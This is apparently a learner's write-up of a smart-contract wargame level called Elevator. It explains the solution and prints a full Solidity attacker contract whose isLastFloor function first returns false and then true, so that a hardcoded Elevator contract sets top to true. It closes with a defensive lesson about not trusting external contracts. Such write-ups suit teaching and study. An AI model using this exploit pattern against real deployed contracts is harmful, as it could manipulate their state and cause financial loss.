### Level 11: Elevator

**Date:** 25-04-2026\
**Difficulty:** Medium

#### Thinking:

-   First of all, I did not understand the task itself. So I spent time thinking about it and also got help from LLP to understand the objective.
-   Then I learned that the goal is to make `top` equal to `true`. 🙂
-   But `top` is decided by a function from another contract, and I did not know how it worked because we only had the method signature of the `Building` contract.
-   I started researching:
    -   Interfaces in Solidity
    -   Type casting contract addresses
    -   External function calls

#### Learning: `Building building = Building(msg.sender);`

-   It means: *"Look at this specific address that already exists and assume it follows the `Building` blueprint."*
-   Now I can create my own `Building` contract, which must contain a matching `isLastFloor` function signature.
-   By doing this, the `Elevator` contract simply calls my own `isLastFloor()` method defined in my custom `Building` contract.

contract Building {

    address _owner;\
    uint256 constant TOPFLOOR = 2;\
    address constant ELEVATOR = 0xbc2687b4878DAeCC80D54b951D4B3745c49a4fb6;

    bool isLimitReached = false;

    constructor() {\
        _owner = msg.sender;\
    }

    modifier onlyOwner() {\
        require(msg.sender == _owner, "Not owner");\
        _;\
    }

    function isLastFloor(uint256 _value) public returns (bool) {\
        if (isLimitReached) {\
            return true;\
        }

        if (_value <= TOPFLOOR) {\
            if (_value == TOPFLOOR) {\
                isLimitReached = true;\
            }\
            return false;\
        } else {\
            return true;\
        }\
    }

    function callElevator(uint256 _value) public {\
        IElevator(ELEVATOR).goTo(_value);\
    }\
}

#### Mistakes:

-   I added the `onlyOwner` modifier to both functions: `isLastFloor` and `callElevator`.
-   When I called `callElevator`, it threw an error.
-   The reason is that inside the `Elevator` contract, `msg.sender` becomes the contract that initiated the call, not me directly.
-   This behavior comes from:

Building building = Building(msg.sender);

-   So `Elevator` interacts with my contract address, not my wallet address.

> Never trust external contracts to tell you the truth about your own state.